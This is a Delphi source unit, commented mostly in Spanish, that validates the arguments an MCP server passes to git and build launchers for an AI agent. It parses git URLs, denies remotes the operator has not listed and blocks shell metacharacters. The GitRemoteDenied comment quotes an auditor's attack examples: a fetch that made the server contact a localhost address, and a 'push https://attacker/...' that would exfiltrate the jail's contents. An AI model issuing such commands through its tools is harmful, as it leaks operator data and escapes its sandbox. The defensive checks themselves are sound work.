unit Lsp.Args;

{ LOS ARGUMENTOS DE UNA ORDEN: las puertas de lo que llega a
  la linea de git y de los lanzadores (GitRemoteDenied con su lector de host
  GitUrlHost, ShellArgDenied), la clasificacion de una orden de git en
  consulta o escritura (GitCommandIsQuery) y el nombre del fichero del
  mensaje de un commit (NombreDeMensajeGit). La lista negra de los args
  libres de git (GitArgDenied) se fue con los args en la 1.19.0: delphi_git
  compone cada orden con campos que elige.

  Salen de Lsp.Guard el 8-oct-2026 (la 1.18.0, la version de la limpieza),
  movidos sin cambiar una linea, con PrimerTrozo, el unico trozo de la jaula
  que usaban. Van DEBAJO de la jaula: la puerta de entrada (ToolCallDenied)
  y la credencial de solo lectura preguntan aqui, y aqui solo se pregunta a
  Lsp.Settings (los remotos declarados) y a Lsp.Casa (la temporal del
  servidor). El troceador de una linea (TrocearArgs) y su compositor
  (EnComillas) bajaron a Lsp.ProcessLaunch el 9-oct-2026, con el lanzador:
  asi los alcanza tambien McpRunJob, que tenia una gemela (ComillasWin). }

interface

{ El primer trozo de S partido por ASeps; '' si S es ''. S.Split(...)[0] a
  secas lee fuera del array cuando S es '' (Delphi devuelve un array
  VACIO): un Access violation medido el 25-ago en delphi_edit y parcheado
  en ESE sitio, y otra vez el 26-sep en delphi_textedit (una tanda con un
  ancla vacia y "occurrence"), con otros cinco Split()[0] sueltos. }
function PrimerTrozo(const S: string; const ASeps: array of Char): string;

function NombreDeMensajeGit: string;

{ La mitad de CONSULTA de delphi_git: lo que una credencial de solo lectura
  y un proyecto de REFERENCIA (ReadOnlyRoots) pueden ejecutar. UNA lista:
  la consulta ToolCallDenied y la consulta la propia tool. Por los campos
  de la llamada (1.19.0): la accion de stash y worktree, el nombre de tag. }
function GitCommandIsQuery(const ACmd, AAccion, ANombre, AMessage: string): Boolean;

{ '' when AText carries none of the shell metacharacters that would break a
  command line ( ; | & ` $ < > and newlines ), otherwise a refusal. For tool
  arguments that end up on a paclient/msbuild command line. }
function ShellArgDenied(const AText: string): string;

{ Whether a git argument names a remote the operator has NOT allowed.

  Measured 2026-08-25 by an auditor working only through MCP: `delphi_git
  command=fetch args="http://127.0.0.1:3131/mcp"` made the SERVER open a
  connection to that address, and `push https://attacker/... HEAD:main` would
  have walked the jail's contents out of the building. The agent's universe is
  supposed to end at the jail; an arbitrary outbound URL turns the server into
  a proxy into its own network (localhost, internal services, metadata
  endpoints) and into an exfiltration channel.

  Toda direccion de red pasa por GitRemotes= del workspace activo, una
  lista de hosts que declara el operador. Vacia (el valor por defecto),
  niega tanto las direcciones de la llamada como las de un remoto del repo.
  Solo el operador decide los hosts con los que esta maquina puede hablar.
  ADelRepo: la direccion es la de un remoto del repo, no una escrita en la
  llamada; con la lista vacia lleva su propio mensaje (GIT-063): el de la
  llamada (GIT-004) aconseja usar el nombre del remoto, y eso ya se hizo. }
function GitRemoteDenied(const AText: string; AScpCorto: Boolean = False;
  ADelRepo: Boolean = False): string;

{ El host de una direccion de RED de git; '' si no lo es (un nombre, una
  rama, una carpeta). El lector de GitRemoteDenied, en la interface desde la
  1.7.7: la tool de git pregunta con el si el remoto de una llamada es de red
  o es una carpeta, que pasa por la jaula. UN lector de "esto es una
  direccion de red". }
function GitUrlHost(const AToken: string; AScpCorto: Boolean = False): string;

implementation

uses
  System.SysUtils,
  System.StrUtils,
  System.IOUtils,
  System.RegularExpressions,
  Lsp.ProcessLaunch,    // TrocearArgs: el troceador de la linea, y su inversa EnComillas
  Lsp.Texts,
  Lsp.Settings,         // GitRemoteHosts y HostsDeLista: los remotos que declara el workspace
  Lsp.Casa,             // ServerTempDir y FragmentoUnico: el mensaje de un commit, en la casa
  Lsp.Pascal;           // SinMayusculas: EL pliegue de lo que no es una ruta

{ UN nombrador del fichero -F de git, junto a su filtro de argumentos. }
function NombreDeMensajeGit: string;
begin
  Result := TPath.Combine(ServerTempDir('git'),
    'msg-' + FragmentoUnico + '.txt');
end;

const
  { El host de una DIRECCION que no se lee sin adivinar (GitUrlHost): no casa
    con ninguna lista, y GitRemoteDenied lo niega con su motivo (GIT-062). }
  GIT_HOST_ILEGIBLE = '?';

{ Host of a git address, '' when the token is not an address at all (a
  branch, a path, an option). Understands the two shapes git takes:
  scheme://[user@]host[:port]/... and the scp-like [user@]host:path.

  Una DIRECCION cuyo host no se lee sin adivinar contesta GIT_HOST_ILEGIBLE,
  que no casa con ninguna lista. git, ssh y curl no parten igual la
  autoridad: git busca '@[' en toda la cadena y decodifica los %xx de ssh://,
  OpenSSH toma la ULTIMA @ y curl corta en ? y #. La primera version que leia
  el host de la autoridad (addc44e) eligio unos terminadores, y su revisor
  midio una docena de direcciones que cada programa leia de otra forma -
  algunas pasaban con GitRemotes vacio -. Asi que no se elige: la autoridad
  (hasta la primera / de una URL, hasta el primer : de la forma scp, sin
  contar un literal IPv6 entre corchetes) solo vale con lo que todos leen
  igual - usuario [A-Za-z0-9._~+-] (y ':' en una URL), una sola @, host
  [A-Za-z0-9._-] o [v6], puerto en cifras -, y lo demas (% \ ? # blancos,
  corchetes fuera de su sitio, dos @, un '@[' fuera de la autoridad, un host
  vacio, un usuario en git://) se niega por ilegible. file:// no es de red:
  lo juzga la jaula. }
function GitUrlHost(const AToken: string; AScpCorto: Boolean): string;
const
  DE_USUARIO = ['A'..'Z', 'a'..'z', '0'..'9', '.', '_', '~', '+', '-'];
  DE_HOST = ['A'..'Z', 'a'..'z', '0'..'9', '.', '_', '-'];
  DE_V6 = ['0'..'9', 'A'..'F', 'a'..'f', ':', '.'];
var
  T, Esquema, Autoridad, Usuario, Host, Puerto: string;
  P, K, Fin: Integer;
  EsUrl: Boolean;
begin
  Result := '';
  T := AToken.Trim.Trim(['"', '''']);
  P := Pos('://', T);
  EsUrl := P > 0;
  Esquema := '';
  if EsUrl then
  begin
    Esquema := LowerCase(Copy(T, 1, P - 1));
    if Esquema = 'file' then
      Exit; // una carpeta: la juzga la jaula, no la lista de hosts
    T := Copy(T, P + 3, MaxInt);
  end
  else if not ((Pos('@', T) > 0) and (Pos(':', T) > Pos('@', T))) and
          not (AScpCorto and TRegEx.IsMatch(T, '^[A-Za-z0-9][A-Za-z0-9.-]+:[^:\\]')) then
    { scp corto host:ruta: dos letras o mas antes del ':' -> no es una unidad
      (C:\ o C:/) }
    Exit; // not an address: a branch, a path, an option
  Result := GIT_HOST_ILEGIBLE; // ES una direccion: lo que no se lea, no casa
  // un blanco dentro de una direccion: git la recibe entera (el message de
  // clone) y nadie la lee igual
  if T.IndexOfAny([' ', #9, #13, #10]) >= 0 then
    Exit;
  // la autoridad: en una URL, hasta la primera /; en la forma scp, hasta el
  // primer ':', salvo el de dentro de un literal IPv6 al principio del host
  // ([v6]:ruta o usuario@[v6]:ruta)
  if EsUrl then
  begin
    Fin := Pos('/', T);
    if Fin = 0 then
      Fin := Length(T) + 1;
  end
  else
  begin
    K := Pos('@[', T);
    if T.StartsWith('[') then
      K := 0
    else if (K > 0) and (K < Pos(':', T)) then
      K := K + 1
    else
      K := -1;
    if K >= 0 then
    begin
      P := Pos(']', T, K + 1);
      if (P = 0) or (P >= Length(T)) or (T[P + 1] <> ':') then
        Exit;
      Fin := P + 1;
    end
    else
      Fin := Pos(':', T);
  end;
  Autoridad := Copy(T, 1, Fin - 1);
  // git busca '@[' en TODO el resto (host_end): solo vale el de la autoridad,
  // justo detras del usuario
  K := Pos('@[', T);
  if (K > 0) and ((K > Length(Autoridad)) or (Pos('@', Autoridad) <> K)) then
    Exit;
  // [usuario@]host[:puerto]
  P := Pos('@', Autoridad);
  if P > 0 then
  begin
    Usuario := Copy(Autoridad, 1, P - 1);
    Autoridad := Copy(Autoridad, P + 1, MaxInt);
    if Pos('@', Autoridad) > 0 then
      Exit; // dos @: cada programa lee una
    if Esquema = 'git' then
      Exit; // git:// no tiene usuario: git buscaria 'usuario@host' entero
    for var C in Usuario do
      if not (CharInSet(C, DE_USUARIO) or (EsUrl and (C = ':'))) then
        Exit;
  end;
  Puerto := '';
  if Autoridad.StartsWith('[') then
  begin
    P := Pos(']', Autoridad);
    if P = 0 then
      Exit;
    Host := Copy(Autoridad, 2, P - 2);
    Puerto := Copy(Autoridad, P + 1, MaxInt);
    if Host = '' then
      Exit;
    for var C in Host do
      if not CharInSet(C, DE_V6) then
        Exit;
  end
  else
  begin
    P := Pos(':', Autoridad);
    if P > 0 then
    begin
      Host := Copy(Autoridad, 1, P - 1);
      Puerto := Copy(Autoridad, P, MaxInt);
    end
    else
      Host := Autoridad;
    if Host = '' then
      Exit;
    for var C in Host do
      if not CharInSet(C, DE_HOST) then
        Exit;
  end;
  // el puerto, solo en una URL: ':' y cifras
  if Puerto <> '' then
  begin
    if not EsUrl or (Puerto[1] <> ':') then
      Exit;
    for var C in Copy(Puerto, 2, MaxInt) do
      if not CharInSet(C, ['0'..'9']) then
        Exit;
  end;
  Result := SinMayusculas(Host);
end;

function GitRemoteDenied(const AText: string; AScpCorto: Boolean;
  ADelRepo: Boolean): string;
var
  Tok, Host, Allowed: string;
  Ok: Boolean;
begin
  Result := '';
  for Tok in TrocearArgs(AText) do
  begin
    Host := GitUrlHost(Tok, AScpCorto);
    if Host = '' then
      Continue;
    if Host = GIT_HOST_ILEGIBLE then
      Exit(MsgFmt(SR_GIT_REMOTE_AMBIGUA_FMT, [Tok]));
    Allowed := GitRemoteHosts;
    if Allowed = '' then
      if ADelRepo then
        Exit(MsgFmt(SR_GIT_REMOTE_DEL_REPO_OFF_FMT, [Host]))
      else
        Exit(MsgFmt(SR_GIT_REMOTE_OFF_FMT, [Host]));
    Ok := False;
    // el comodin de las listas blancas, el de las cuatro (EsComodinDeLista)
    for var H in HostsDeLista(Allowed) do
      if SameText(H, Host) or EsComodinDeLista(H) then
      begin
        Ok := True;
        Break;
      end;
    if not Ok then
      Exit(MsgFmt(SR_GIT_REMOTE_HOST_FMT, [Host, Allowed]));
  end;
end;

{ LISTA NEGRA: metacaracteres de shell conocidos; no sustituye las listas
  blancas de ordenes, identificadores o plataformas de cada herramienta. }
function ShellArgDenied(const AText: string): string;
const
  Bad: array [0 .. 8] of string = (';', '|', '&', '`', '$', '<', '>', #13, #10);
var
  B: string;
begin
  Result := '';
  for B in Bad do
    if AText.Contains(B) then
      Exit(MsgFmt(SR_SHELL_META_FMT, [B]));
end;

function GitCommandIsQuery(const ACmd, AAccion, ANombre, AMessage: string): Boolean;
begin
  // branch solo lista desde la 1.19.0 (crear es switch create=true)
  Result := MatchText(Trim(ACmd), ['status', 'diff', 'log', 'show', 'ls-remote', 'branch']) or
    // tag sin nombre lista los que hay
    (SameText(Trim(ACmd), 'tag') and (Trim(ANombre) = '') and (Trim(AMessage) = '')) or
    // worktree list solo ENSENA las copias de trabajo (1.4.0)
    (SameText(Trim(ACmd), 'worktree') and SameText(Trim(AAccion), 'list')) or
    // ...y stash list, lo aparcado: pasaba por escritura, con el cerrojo
    // de los escritores y parando los motores del repo (1.7.7)
    (SameText(Trim(ACmd), 'stash') and SameText(Trim(AAccion), 'list')) or
    // ...y config sin valor LEE el que hay (1.21.1; se negaba con GIT-033)
    (SameText(Trim(ACmd), 'config') and (Trim(AMessage) = ''));
end;

function PrimerTrozo(const S: string; const ASeps: array of Char): string;
var
  Partes: TArray<string>;
begin
  Partes := S.Split(ASeps);
  if Length(Partes) = 0 then
    Result := ''
  else
    Result := Partes[0];
end;

end.